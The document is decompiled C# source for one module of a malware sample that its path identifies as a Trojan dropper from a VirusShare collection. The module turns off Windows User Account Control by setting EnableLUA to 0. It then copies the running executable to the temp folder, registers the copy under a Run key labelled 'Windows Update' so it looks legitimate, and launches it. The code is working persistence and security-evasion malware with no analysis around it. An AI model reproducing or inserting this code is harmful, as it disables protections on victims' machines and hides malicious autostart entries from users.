// Decompiled with JetBrains decompiler
// Type: hdfghfdghdfghfdgh.Registry_Autostart
// Assembly: fghdfgh, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 59D2BBAC-52A4-41AF-9009-6C20D7F64D35
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Sysn.axbd-19c0d39edbfe66a3ff8170bfe7fc83c000c848bee85291ee0a85269d21b676a2.exe

using hdfghfdghdfghfdgh.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace hdfghfdghdfghfdgh
{
  [StandardModule]
  internal sealed class Registry_Autostart
  {
    public static void autostart(string name)
    {
      string str = Interaction.Environ("tmp") + "\\" + name;
      if (File.Exists(str))
        return;
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (Operators.CompareString(registryKey.GetValue("EnableLUA").ToString(), "1", false) == 0)
          registryKey.SetValue("EnableLUA", (object) "0");
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str, true);
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Update", (object) str);
        Interaction.Shell(str);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
